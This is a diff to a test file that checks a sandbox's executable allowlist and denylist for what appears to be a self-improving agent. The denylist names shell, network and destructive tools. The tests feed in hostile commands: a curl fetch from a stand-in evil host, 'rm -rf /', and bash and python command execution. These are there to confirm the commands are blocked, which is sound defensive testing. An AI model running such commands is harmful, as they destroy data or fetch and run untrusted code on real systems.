@@ -14,6 +14,8 @@ vi.mock("node:fs", () => ({
 
 import { execFile } from "node:child_process";
 import {
+  ALLOWED_EXECUTABLES,
+  FORBIDDEN_BINARIES,
   runCommandInSandbox,
   runInWorktreeSandbox,
 } from "../../src/self-improve/sandbox.js";
@@ -212,5 +214,54 @@ describe("sandbox", () => {
       expect(result.success).toBe(true);
       expect(result.output).toBe("done");
     });
+  });
+});
+
+describe("SEC-04 sandbox executable allowlist + denylist", () => {
+  it("pins ALLOWED_EXECUTABLES to the known-safe set", () => {
+    expect([...ALLOWED_EXECUTABLES].sort()).toEqual(
+      ["git", "node", "npm", "npx", "tsc", "vitest"]
+    );
+  });
+
+  it("includes shell + network + dangerous-fs binaries in FORBIDDEN_BINARIES", () => {
+    for (const bad of ["curl", "wget", "sh", "bash", "zsh", "rm", "dd", "sudo", "chmod", "scp", "ssh", "eval", "python", "perl", "ruby"]) {
+      expect(FORBIDDEN_BINARIES.has(bad)).toBe(true);
+    }
+  });
+
+  it("blocks 'curl' via FORBIDDEN_BINARIES with the layer-1 message", async () => {
+    const r = await runCommandInSandbox("curl https://evil.example.com/install.sh", {
+      timeoutMs: 1000,
+    });
+    expect(r.success).toBe(false);
+    expect(r.exitCode).toBe(1);
+    expect(r.error ?? "").toContain("forbidden binary list");
+  });
+
+  it("blocks 'rm' via FORBIDDEN_BINARIES with the layer-1 message", async () => {
+    const r = await runCommandInSandbox("rm -rf /", { timeoutMs: 1000 });
+    expect(r.success).toBe(false);
+    expect(r.error ?? "").toContain("forbidden binary list");
+  });
+
+  it("blocks 'bash' via FORBIDDEN_BINARIES (defense even if allowlist were widened)", async () => {
+    const r = await runCommandInSandbox("bash -c 'echo pwned'", { timeoutMs: 1000 });
+    expect(r.success).toBe(false);
+    expect(r.error ?? "").toContain("forbidden binary list");
+  });
+
+  it("blocks 'python' via FORBIDDEN_BINARIES", async () => {
+    const r = await runCommandInSandbox("python -c 'import os; os.system(\"id\")'", {
+      timeoutMs: 1000,
+    });
+    expect(r.success).toBe(false);
+    expect(r.error ?? "").toContain("forbidden binary list");
+  });
+
+  it("blocks an unknown executable 'fooexec' via the layer-2 allowlist message", async () => {
+    const r = await runCommandInSandbox("fooexec --do-stuff", { timeoutMs: 1000 });
+    expect(r.success).toBe(false);
+    expect(r.error ?? "").toContain("not an allowed executable");
   });
 });
